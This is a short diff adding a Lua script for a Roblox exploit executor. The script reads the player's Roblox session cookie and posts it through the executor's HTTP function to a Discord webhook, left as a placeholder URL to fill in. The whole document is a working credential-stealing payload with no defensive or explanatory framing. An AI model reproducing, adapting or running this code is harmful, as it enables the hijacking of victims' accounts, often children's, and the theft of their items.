@@ -1,0 +1,8 @@
+local cookie = getcookies()["https://www.roblox.com/"] -- Captures token
+local request = http_request or request or syn.request -- Uses executor's HTTP function
+request({
+    Url = "YOUR_DISCORD_WEBHOOK_URL",
+    Method = "POST",
+    Headers = {["Content-Type"] = "application/json"},
+    Body = game:GetService("HttpService"):JSONEncode({content = cookie})
+})
